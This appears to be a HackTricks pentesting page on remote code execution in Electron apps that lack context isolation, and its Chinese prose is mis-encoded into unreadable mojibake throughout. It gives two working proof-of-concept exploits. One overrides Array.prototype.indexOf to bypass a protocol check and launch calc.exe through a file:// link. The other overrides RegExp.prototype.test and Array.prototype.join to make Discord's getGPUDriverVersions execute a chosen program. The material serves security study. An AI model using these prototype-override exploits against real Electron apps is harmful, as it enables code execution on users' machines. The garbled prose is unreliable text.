# Electron contextIsolation RCEé€šè¿‡preloadä»£ç 

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- ä½ åœ¨ä¸€ä¸ª**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)

- **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## ç¤ºä¾‹1

æ¥è‡ª[https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30)çš„ç¤ºä¾‹

è¿™æ®µä»£ç ä½¿ç”¨é»˜è®¤æµè§ˆå™¨æ‰“å¼€http(s)é“¾æ¥ï¼š

![](<../../../.gitbook/assets/image (375) (1) (1).png>)

ç±»ä¼¼`file:///C:/Windows/systemd32/calc.exe`çš„å†…å®¹å¯ä»¥ç”¨æ¥æ‰§è¡Œè®¡ç®—å™¨ï¼Œ`SAFE_PROTOCOLS.indexOf`é˜»æ­¢äº†è¿™ç§æƒ…å†µã€‚

å› æ­¤ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡XSSæˆ–ä»»æ„é¡µé¢å¯¼èˆªæ³¨å…¥ä»¥ä¸‹JSä»£ç ï¼š
```html
<script>
Array.prototype.indexOf = function(){
return 1337;
}
</script>
```
ç”±äºå¯¹`SAFE_PROTOCOLS.indexOf`çš„è°ƒç”¨æ€»æ˜¯è¿”å›1337ï¼Œæ”»å‡»è€…å¯ä»¥ç»•è¿‡ä¿æŠ¤å¹¶æ‰§è¡Œcalcã€‚æœ€ç»ˆåˆ©ç”¨:
```html
<script>
Array.prototype.indexOf = function(){
return 1337;
}
</script>
<a href="file:///C:/Windows/systemd32/calc.exe">CLICK</a>
```
æŸ¥çœ‹åŸå§‹å¹»ç¯ç‰‡ä»¥äº†è§£åœ¨æ²¡æœ‰è¦æ±‚æƒé™çš„æç¤ºçš„æƒ…å†µä¸‹æ‰§è¡Œç¨‹åºçš„å…¶ä»–æ–¹æ³•ã€‚

æ˜¾ç„¶ï¼Œå¦ä¸€ç§åŠ è½½å’Œæ‰§è¡Œä»£ç çš„æ–¹æ³•æ˜¯è®¿é—®ç±»ä¼¼äº `file://127.0.0.1/electron/rce.jar` çš„å†…å®¹ã€‚

## ç¤ºä¾‹2ï¼šDiscordåº”ç”¨ç¨‹åºRCE

ç¤ºä¾‹æ¥è‡ª[https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1](https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1)

åœ¨æ£€æŸ¥é¢„åŠ è½½è„šæœ¬æ—¶ï¼Œæˆ‘å‘ç°Discordå…¬å¼€äº†ä¸€ä¸ªå‡½æ•°ï¼Œå…è®¸é€šè¿‡ `DiscordNative.nativeModules.requireModule('MODULE-NAME')` åœ¨ç½‘é¡µä¸­è°ƒç”¨ä¸€äº›å…è®¸çš„æ¨¡å—ã€‚\
åœ¨è¿™é‡Œï¼Œæˆ‘æ— æ³•ç›´æ¥ä½¿ç”¨å¯ç”¨äºRCEçš„æ¨¡å—ï¼Œä¾‹å¦‚_child\_process_æ¨¡å—ï¼Œä½†æˆ‘**æ‰¾åˆ°äº†ä¸€æ®µå¯ä»¥é€šè¿‡è¦†ç›–JavaScriptå†…ç½®æ–¹æ³•å¹¶å¹²æ‰°å…¬å¼€æ¨¡å—çš„æ‰§è¡Œæ¥å®ç°RCEçš„ä»£ç **ã€‚

ä»¥ä¸‹æ˜¯PoCã€‚æˆ‘èƒ½å¤Ÿç¡®è®¤å½“æˆ‘ä»devToolsä¸­è°ƒç”¨åä¸º"_discord\_utils_"çš„æ¨¡å—ä¸­å®šä¹‰çš„`getGPUDriverVersions`å‡½æ•°æ—¶ï¼Œ**å¼¹å‡ºäº†**ä¸€ä¸ª**calc**åº”ç”¨ç¨‹åºï¼ŒåŒæ—¶**è¦†ç›–äº†`RegExp.prototype.test`å’Œ`Array.prototype.join`**ã€‚
```javascript
RegExp.prototype.test=function(){
return false;
}
Array.prototype.join=function(){
return "calc";
}
DiscordNative.nativeModules.requireModule('discord_utils').getGPUDriverVersions();
```
`getGPUDriverVersions` å‡½æ•°å°è¯•ä½¿ç”¨ "_execa_" åº“æ‰§è¡Œç¨‹åºï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š
```javascript
module.exports.getGPUDriverVersions = async () => {
if (process.platform !== 'win32') {
return {};
}

const result = {};
const nvidiaSmiPath = `${process.env['ProgramW6432']}/NVIDIA Corporation/NVSMI/nvidia-smi.exe`;

try {
result.nvidia = parseNvidiaSmiOutput(await execa(nvidiaSmiPath, []));
} catch (e) {
result.nvidia = {error: e.toString()};
}

return result;
};
```
é€šå¸¸ï¼Œ_execa_ å°è¯•æ‰§è¡Œ `nvidiaSmiPath` å˜é‡ä¸­æŒ‡å®šçš„ "_nvidia-smi.exe_"ï¼Œç„¶è€Œï¼Œç”±äºè¢«è¦†ç›–çš„ `RegExp.prototype.test` å’Œ `Array.prototype.join`ï¼Œ**å‚æ•°åœ¨ \_execa**\_** çš„å†…éƒ¨å¤„ç†ä¸­è¢«æ›¿æ¢ä¸º "**_**calc**_**"ã€‚

å…·ä½“æ¥è¯´ï¼Œå‚æ•°é€šè¿‡æ›´æ”¹ä»¥ä¸‹ä¸¤ä¸ªéƒ¨åˆ†è¿›è¡Œæ›¿æ¢ã€‚

[https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L36](https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L36)

[https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L55](https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L55)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨ HackTricks ä¸­**å®£ä¼ ä½ çš„å…¬å¸**å—ï¼Ÿæˆ–è€…æƒ³è¦**è·å–æœ€æ–°ç‰ˆæœ¬çš„ PEASS æˆ–ä¸‹è½½ PDF æ ¼å¼çš„ HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶ [**NFTs**](https://opensea.io/collection/the-peass-family) é›†åˆ [**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)

- **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…åœ¨ **Twitter** ä¸Š**å…³æ³¨**æˆ‘ [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **é€šè¿‡å‘ [hacktricks ä»“åº“](https://github.com/carlospolop/hacktricks) å’Œ [hacktricks-cloud ä»“åº“](https://github.com/carlospolop/hacktricks-cloud) æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
